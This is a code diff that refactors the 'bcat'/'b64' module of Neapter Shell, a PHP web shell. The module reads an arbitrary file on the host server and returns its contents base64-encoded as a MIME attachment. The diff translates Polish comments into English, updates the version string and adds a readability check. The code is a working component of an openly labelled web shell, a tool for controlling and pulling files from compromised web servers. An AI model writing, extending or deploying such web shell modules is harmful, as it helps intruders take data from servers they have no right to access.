@@ -3,56 +3,54 @@
 /**
  * Neapter Shell
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @license   http://www.gnu.org/licenses/gpl-3.0.txt
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 
 /**
- * Wyswietlanie zawartosci pliku w base64
+ * Encode file using base64
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @package    Neapter
- * @subpackage Modules
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 class ModuleBcat extends ModuleAbstract
 {
     /**
-     * Dostepna lista komend
+     * Get list of available commands
      *
-     * @access public
      * @return array
      */
     public static function getCommands()
     {
-        return array
-        (
+        return array(
             'bcat',
             'b64'
         );
     }
 
     /**
-     * Zwracanie wersji modulu
+     * Get module version
      *
-     * @access public
      * @return string
      */
     public static function getVersion()
     {
-        /**
-         * Wersja Data Autor
-         */
-        return '1.00 2011-06-04 - <krzotr@gmail.com>';
+        return '1.0.1 2016-06-17 - <krzotr@gmail.com>';
     }
 
     /**
-     * Zwracanie pomocy modulu
+     * Get details module information
      *
-     * @access public
      * @return string
      */
     public static function getHelp()
@@ -69,38 +67,34 @@ DATA;
     }
 
     /**
-     * Wywolanie modulu
+     * Execute module
      *
-     * @access public
      * @return string
      */
     public function get()
     {
-        /**
-         * Help
-         */
         if ($this->oArgs->getNumberOfParams() === 0) {
             return self::getHelp();
         }
 
-        /**
-         * Plik zrodlowy musi istniec
-         */
-
         $sFilePath = $this->oArgs->getParam(0);
 
-        if (!is_file($sFilePath)) {
+        if (!(is_file($sFilePath) && is_readable($sFilePath))) {
             return sprintf('Plik "%s" nie istnieje', $sFilePath);
         }
 
-        /**
-         * Naglowek Mime i zrodlo pliku w base64
-         */
-        $sMime = sprintf("MIME-Version: 1.0\r\nContent-Type: application/octet-stream; name=\"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"%s\"\r\n\r\n",
-            basename($sFilePath), basename($sFilePath)
+        $sHeader = "MIME-Version: 1.0\r\n" .
+            "Content-Type: application/octet-stream; name=\"%s\"\r\n" .
+            "Content-Transfer-Encoding: base64\r\n" .
+            "Content-Disposition: attachment; filename=\"%s\"\r\n\r\n%s";
+
+        $sMime = sprintf(
+            $sHeader,
+            basename($sFilePath),
+            basename($sFilePath),
+            chunk_split(base64_encode(file_get_contents($sFilePath)), 130)
         );
 
-        return htmlspecialchars($sMime . chunk_split(base64_encode(file_get_contents($sFilePath)), 130));
+        return htmlspecialchars($sMime);
     }
-
 }
